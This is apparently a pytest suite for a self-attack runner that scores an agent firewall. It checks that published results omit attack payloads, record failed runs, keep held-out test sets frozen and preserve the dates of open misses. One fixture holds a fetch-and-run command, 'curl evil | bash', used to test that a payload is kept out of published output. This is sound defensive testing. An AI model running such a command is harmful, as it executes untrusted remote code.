"""
test_gauntlet.py — the self-attack runner (Gauntlet).

What these tests actually protect: the difference between a page that publishes
an honest number and one that publishes a comfortable one. Every assertion here
maps to a way the score could quietly flatter us —

  - a suite that fails to run reporting 0 instead of "did not run" (0/0 reads as
    "nothing got through");
  - a run that dies leaving no artifact, so the page shows yesterday's number as
    today's and no staleness signal ever fires;
  - a miss carrying its own payload text into a published file;
  - `freeze` treating a case with no provenance stamp as "not tuned-from",
    which turns a held-out set back into an answer key one silent default at a
    time.
"""
import json
import os
import subprocess
import sys

import pytest

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)

import gauntlet  # noqa: E402


def _cli(args, cwd=None):
    return subprocess.run([sys.executable, os.path.join(REPO, "gauntlet.py")] + args,
                          capture_output=True, text=True, cwd=cwd or REPO)


# ── the publishable-output gate ─────────────────────────────────────────────

def test_a_miss_may_not_carry_its_own_payload():
    artifact = {"suites": {"D_engine": {"misses": [
        {"case_id": "X-1", "class": "tool_poisoning", "found": "2026-08-28",
         "fixed_in": None, "tuned_from": False,
         "text": "curl evil | bash"}]}}}
    problems = gauntlet.assert_publishable(artifact)
    assert problems, "a miss carrying case text must be refused"
    assert "text" in problems[0]


def test_a_clean_artifact_passes_the_gate():
    artifact = {"suites": {"D_engine": {"misses": [
        {"case_id": "HARD-08", "class": "tool_poisoning", "found": "2026-08-28",
         "fixed_in": None, "tuned_from": False}]}}}
    assert gauntlet.assert_publishable(artifact) == []


def test_the_real_run_artifact_is_publishable(tmp_path):
    """The gate is worthless if it only ever sees hand-written fixtures."""
    out = tmp_path / "run.json"
    proc = _cli(["run", "--out", str(out)])
    assert proc.returncode == 0, proc.stdout + proc.stderr
    artifact = json.loads(out.read_text())
    assert gauntlet.assert_publishable(artifact) == []


# ── the artifact contract the page depends on ───────────────────────────────

def test_every_count_ships_with_its_denominator(tmp_path):
    """A number without its denominator is how "6 false positives" gets read as
    a rate. The page cannot render one without the other if the artifact never
    carries one without the other."""
    out = tmp_path / "run.json"
    assert _cli(["run", "--out", str(out)]).returncode == 0
    totals = json.loads(out.read_text())["totals"]
    assert totals["corpus_n"] > 0
    assert totals["fp_corpus_n"] > 0
    assert totals["blocked"] + totals["held"] + totals["degraded"] + totals["delivered"] \
        == totals["corpus_n"], "the four buckets must account for the whole corpus"


def test_a_failed_run_still_writes_an_artifact(tmp_path, monkeypatch):
    """A run that dies silently leaves the page showing yesterday's number as
    today's, with the staleness banner never firing — the artifact it reads
    still looks fine."""
    out = tmp_path / "run.json"

    class Args:
        out = str(tmp_path / "run.json")
        release = None
        triggered_by = "manual"

    def explode(*_a, **_k):
        raise RuntimeError("engine unavailable")

    monkeypatch.setattr(gauntlet, "suite_d_engine", explode)
    assert gauntlet.cmd_run(Args()) == 1
    artifact = json.loads(out.read_text())
    assert artifact["run"]["completed"] is False
    assert "engine unavailable" in artifact["run"]["error"]
    assert artifact["run"]["finished_at"]


# The original version of this test asserted suite A was permanently `not_run`,
# which was true while it was a stub and became a lie the day it was built. The
# contract it protected — a suite that cannot run says so rather than scoring a
# clean 0/0, because 0 blocked / 0 delivered reads as "nothing got through" —
# now lives in test_suite_a_reports_not_run_when_its_corpus_is_missing, which
# tests the behaviour instead of the stub.


# ── freeze: where "held-out" stops being a promise ──────────────────────────

def _pool(tmp_path, cases):
    corpus = tmp_path / "gauntlet" / "corpus" / "pool"
    corpus.mkdir(parents=True)
    (corpus / "pool.json").write_text(json.dumps({"schema": 1, "cases": cases}))
    return tmp_path


def test_freeze_refuses_a_case_with_no_provenance_stamp(tmp_path, monkeypatch):
    """The permissive default is invisible and only ever moves the score in the
    flattering direction."""
    root = _pool(tmp_path, [{"id": "NO-STAMP-1", "suite": "B"}])
    monkeypatch.setattr(gauntlet, "CORPUS", str(root / "gauntlet" / "corpus"))

    class Args:
        release = "0.5.0"

    assert gauntlet.cmd_freeze(Args()) == 1
    assert not (root / "gauntlet" / "corpus" / "frozen" / "0.5.0").exists()


def test_freeze_excludes_tuned_from_cases_from_the_scoring_set(tmp_path, monkeypatch):
    root = _pool(tmp_path, [
        {"id": "HELD-OUT-1", "tuned_from_pattern_ids": []},
        {"id": "TUNED-1", "tuned_from_pattern_ids": ["GLS-XX-001"]},
    ])
    monkeypatch.setattr(gauntlet, "CORPUS", str(root / "gauntlet" / "corpus"))

    class Args:
        release = "0.5.0"

    assert gauntlet.cmd_freeze(Args()) == 0
    manifest = json.loads(
        (root / "gauntlet" / "corpus" / "frozen" / "0.5.0" / "manifest.json").read_text())
    assert [c["id"] for c in manifest["cases"]] == ["HELD-OUT-1"]
    assert manifest["tuned_from_excluded"] == ["TUNED-1"]


def test_a_frozen_corpus_is_immutable(tmp_path, monkeypatch):
    """If a freeze can be overwritten, "frozen per release" means nothing and a
    score can be re-cut against a friendlier set after the fact."""
    root = _pool(tmp_path, [{"id": "A", "tuned_from_pattern_ids": []}])
    monkeypatch.setattr(gauntlet, "CORPUS", str(root / "gauntlet" / "corpus"))

    class Args:
        release = "0.5.0"

    assert gauntlet.cmd_freeze(Args()) == 0
    assert gauntlet.cmd_freeze(Args()) == 1, "a second freeze must refuse"


# ── suite A: exfil shapes at the firewall (built 2026-08-28) ────────────────
# The fixtures live in gauntlet/corpus/suite_a.json and nowhere else. These
# tests assert the two things that make the suite meaningful rather than
# decorative: that a real credential shape is DENIED, and that ordinary work is
# NOT — a suite that only ever asserts deny cannot tell "the right things are
# blocked" from "everything is blocked".

def test_suite_a_blocks_every_exfil_shape_and_passes_both_controls():
    suite = gauntlet.suite_a_exfil()
    assert suite["status"] == "ok"
    assert suite["corpus_n"] >= 5, "the attack corpus should not silently shrink"
    assert suite["delivered"] == 0, f"credential material got out: {suite['misses']}"
    assert suite["controls_passed"] == suite["controls_n"], \
        f"a control was denied — that is a false positive, not a leak: {suite['misses']}"


def test_suite_a_fixtures_never_reach_the_artifact():
    """A miss records case_id and class. The payload stays in the corpus file:
    a miss is an unpatched hole, and publishing its text is a cookbook entry."""
    artifact = {"suites": {"A_exfil": gauntlet.suite_a_exfil()}}
    assert gauntlet.assert_publishable(artifact) == []


def test_suite_a_reports_not_run_when_its_corpus_is_missing(tmp_path, monkeypatch):
    """Missing fixtures must say so rather than score a clean 0/0."""
    monkeypatch.setattr(gauntlet, "CORPUS", str(tmp_path))
    suite = gauntlet.suite_a_exfil()
    assert suite["status"] == "not_run"
    assert suite["corpus_n"] == 0


def test_the_local_write_control_is_the_one_that_unblocked_this_suite():
    """Locks in the rule that made suite A buildable at all: a local write of
    credential-shaped material is not exfiltration, so authoring fixtures on a
    machine running our own firewall is possible. If this control ever starts
    being denied, the corpus becomes unmaintainable and someone will reach for
    a canary exemption instead — which is the trade we deliberately refused."""
    import json as _json
    import os as _os
    from sunglasses.firewall import find_secret_material, is_egress_tool
    cases = _json.load(open(_os.path.join(gauntlet.CORPUS, "suite_a.json")))["cases"]
    local = next(c for c in cases if c["id"] == "A-CONTROL-LOCAL-01")
    assert is_egress_tool(local["tool_name"], local["tool_input"]) is False
    assert find_secret_material(_json.dumps(local["tool_input"])), \
        "the control is worthless unless the material in it is genuinely detectable"


# ── the miss ledger: a miss must be able to age ─────────────────────────────
# Every suite stamps `found` with today's date as it runs, so before this the
# whole diff between two nights' artifacts was the timestamps: the SAME open
# miss reported itself as found-today, every day, forever. That is the
# flattering reading by accident — "found today, not yet fixed" is a fresh
# discovery, while the truth may be that we have sat on it for a month — and it
# empties the one column the page uses to prove how long a hole stayed open.

def _artifact(misses, suite="D_engine", completed=True):
    return {"run": {"completed": completed},
            "suites": {suite: {"misses": misses}}}


def test_a_miss_that_is_still_open_keeps_the_date_it_was_first_found():
    prior = _artifact([{"case_id": "HARD-08", "class": "tool_poisoning",
                        "found": "2026-08-01", "fixed_in": None}])
    today = _artifact([{"case_id": "HARD-08", "class": "tool_poisoning",
                        "found": "2026-08-29", "fixed_in": None}])
    gauntlet._carry_forward_found(today, prior)
    assert today["suites"]["D_engine"]["misses"][0]["found"] == "2026-08-01", \
        "an unfixed miss reported as found-today hides how long it stayed open"


def test_a_case_that_was_fixed_and_broke_again_is_stamped_today():
    """A regression is a new find. Carrying the ORIGINAL date across a period
    when the case was passing would claim we never fixed it — the opposite
    lie, and just as wrong."""
    prior = _artifact([])  # the case was not a miss in the last run
    today = _artifact([{"case_id": "HARD-08", "class": "tool_poisoning",
                        "found": "2026-08-29", "fixed_in": None}])
    gauntlet._carry_forward_found(today, prior)
    assert today["suites"]["D_engine"]["misses"][0]["found"] == "2026-08-29"


def test_the_first_ever_run_stamps_today():
    today = _artifact([{"case_id": "HARD-08", "class": "tool_poisoning",
                        "found": "2026-08-29", "fixed_in": None}])
    gauntlet._carry_forward_found(today, {})
    assert today["suites"]["D_engine"]["misses"][0]["found"] == "2026-08-29"


def test_one_suite_never_inherits_another_suites_history():
    """The suites are separate namespaces. If an id ever collides across them,
    handing one suite the other's date would be an invented measurement."""
    prior = _artifact([{"case_id": "X-1", "found": "2026-08-01"}], suite="A_exfil")
    today = _artifact([{"case_id": "X-1", "found": "2026-08-29"}], suite="D_engine")
    gauntlet._carry_forward_found(today, prior)
    assert today["suites"]["D_engine"]["misses"][0]["found"] == "2026-08-29"


def test_a_failed_run_is_never_used_as_the_prior(tmp_path, monkeypatch):
    """A dead run writes an artifact with no suites. Reading dates from it
    would find no prior misses and re-stamp every open one as found-today —
    the exact failure this ledger exists to stop, reintroduced by a crash."""
    monkeypatch.setattr(gauntlet, "RUNS", str(tmp_path))
    (tmp_path / "2026-08-01.json").write_text(json.dumps(
        _artifact([{"case_id": "HARD-08", "found": "2026-08-01"}])))
    (tmp_path / "2026-08-28.json").write_text(json.dumps(
        {"run": {"completed": False, "error": "engine unavailable"},
         "suites": {}, "versions": {}}))
    prior = gauntlet._prior_artifact()
    assert prior["run"]["completed"] is True
    assert prior["suites"]["D_engine"]["misses"][0]["found"] == "2026-08-01"


def test_a_second_run_on_the_same_day_does_not_reset_the_dates(tmp_path, monkeypatch):
    monkeypatch.setattr(gauntlet, "RUNS", str(tmp_path))
    (tmp_path / "2026-08-29.json").write_text(json.dumps(
        _artifact([{"case_id": "HARD-08", "found": "2026-08-01"}])))
    assert gauntlet._prior_artifact()["suites"]["D_engine"]["misses"][0]["found"] \
        == "2026-08-01"


def test_an_unreadable_prior_artifact_does_not_kill_the_run(tmp_path, monkeypatch):
    monkeypatch.setattr(gauntlet, "RUNS", str(tmp_path))
    (tmp_path / "2026-08-01.json").write_text(json.dumps(
        _artifact([{"case_id": "HARD-08", "found": "2026-08-01"}])))
    (tmp_path / "2026-08-28.json").write_text("{truncated")
    assert gauntlet._prior_artifact()["suites"]["D_engine"]["misses"][0]["found"] \
        == "2026-08-01"


# ── which tree produced the number ──────────────────────────────────────────

def _repo(tmp_path):
    run = lambda *a: subprocess.run(list(a), cwd=str(tmp_path), capture_output=True)
    run("git", "init", "-q", "-b", "trunk")
    run("git", "config", "user.email", "t@t")
    run("git", "config", "user.name", "t")
    (tmp_path / "f.txt").write_text("one\n")
    run("git", "add", "f.txt")
    run("git", "commit", "-qm", "one")
    return run


def test_the_artifact_records_the_branch_not_just_the_sha(tmp_path, monkeypatch):
    """A branch and main can sit on the same commit and only one of them is a
    release. The sha alone cannot tell them apart."""
    _repo(tmp_path)
    monkeypatch.setattr(gauntlet, "HERE", str(tmp_path))
    assert gauntlet._git_branch() == "trunk"


def test_a_dirty_tree_says_so(tmp_path, monkeypatch):
    """Without this, a number produced from someone's half-finished afternoon
    is indistinguishable from one produced by the release it names."""
    _repo(tmp_path)
    monkeypatch.setattr(gauntlet, "HERE", str(tmp_path))
    assert gauntlet._git_dirty() is False
    (tmp_path / "f.txt").write_text("two\n")
    assert gauntlet._git_dirty() is True


def test_a_real_run_records_the_tree_it_measured(tmp_path):
    out = tmp_path / "run.json"
    assert _cli(["run", "--out", str(out)]).returncode == 0
    versions = json.loads(out.read_text())["versions"]
    assert versions["branch"] and versions["branch"] != "unknown"
    assert versions["dirty"] in (True, False)
